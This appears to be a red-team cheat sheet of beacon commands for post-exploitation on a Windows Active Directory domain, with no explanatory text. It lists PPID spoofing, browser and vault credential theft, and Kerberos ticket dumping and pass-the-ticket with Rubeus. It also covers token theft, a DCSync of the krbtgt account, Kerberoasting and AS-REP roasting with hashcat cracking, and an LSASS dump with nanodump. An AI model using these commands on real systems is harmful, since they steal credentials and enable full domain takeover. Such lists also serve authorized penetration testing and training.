#### OPSEC Safe

PPID Spoof
```powershell
ppid 123
spawnto x64 C:\Windows\System32\svchost.exe
```

Browser credentials
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

Windows Credential Manager
```powershell
run vaultcmd /listcreds:"Windows Credentials" /all
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

 Extracting tickets + renewing them
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x13496b /service:krbtgt /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x13491f /service:ldap /nowrap
```

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
```

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DUBLIN.CONTOSO.COM /username:nwallace /password:FakePass /ticket:

steal_token [PID]
run klist

ls \\lon-fs-1\c$
dcsync DUBLIN.CONTOSO.COM DUBLIN\krbtgt
```
 
 Kerberoasting
```powershell
ldapsearch "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=1048576)))" --attributes samAccountName,servicePrincipalName,objectsid,ntsecuritydescriptor
```

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/dub-sql-2.dublin.contoso.com /simple /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:MSSQLSVC /simple /nowrap
```

```powershell
C:\Tools\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```

AS-REP Roasting
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

---

Nanodump Adpatix C2
```powershell
nanodump -w C:\Windows\System32\dotnet.tmp --valid

pypykatz lsa minidump dotnetdmp.tmp
```
